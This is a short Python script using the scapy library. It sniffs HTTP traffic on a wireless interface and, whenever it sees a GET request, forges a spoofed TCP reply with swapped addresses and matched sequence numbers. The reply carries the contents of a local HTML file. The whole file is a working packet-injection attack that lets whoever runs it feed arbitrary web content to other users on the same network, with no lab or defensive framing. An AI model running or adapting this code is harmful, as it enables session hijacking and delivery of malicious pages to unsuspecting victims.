from scapy.all import *
import socket               # Import socket module
from copy import deepcopy
import threading
import re


interface = 'wlan0'
regex = '.*GET.*text\/html.*'
datafile = 'data.html'
expression = 'tcp port http'

file = open (datafile,'r').read()


def buildForgedPckt(pkt):

	match = re.search("("+regex+")", pkt.getlayer('TCP').load, re.DOTALL)
	if match is not None:
		# Build a forged packet with necessary changes based on original packet copy
		forged_pkt = deepcopy(pkt)
		# Construct the Ethernet header
		forged_pkt[Ether].src, forged_pkt[Ether].dst = pkt[Ether].dst, pkt[Ether].src   # Exchange MACs
		
		# Construct the IP header
		forged_pkt[IP].src, forged_pkt[IP].dst = pkt[IP].dst, pkt[IP].src  # Exchange IPs
		
		# Construct the TCP header
		forged_pkt[TCP].sport, forged_pkt[TCP].dport = pkt[TCP].dport, pkt[TCP].sport   # Exchange Ports
		forged_pkt[TCP].seq = pkt.ack
		forged_pkt[TCP].ack = pkt.seq + (pkt.len - pkt[IP].ihl * 4 - 20) # Original packet length - (size_ip + size_tcp)
		forged_pkt[TCP].payload = file

		del(forged_pkt[IP].len)         # Recalculate the length of IP
		del(forged_pkt[IP].chksum)
		del(forged_pkt[TCP].chksum)

		sendp(forged_pkt, iface = interface)


def customAction(pckt):
	if hasattr(pckt.getlayer('TCP'), 'load'):
		buildForgedPckt(pckt)




packets = sniff (count = 0, iface = interface, filter = expression, prn = lambda pkt: customAction(pkt))

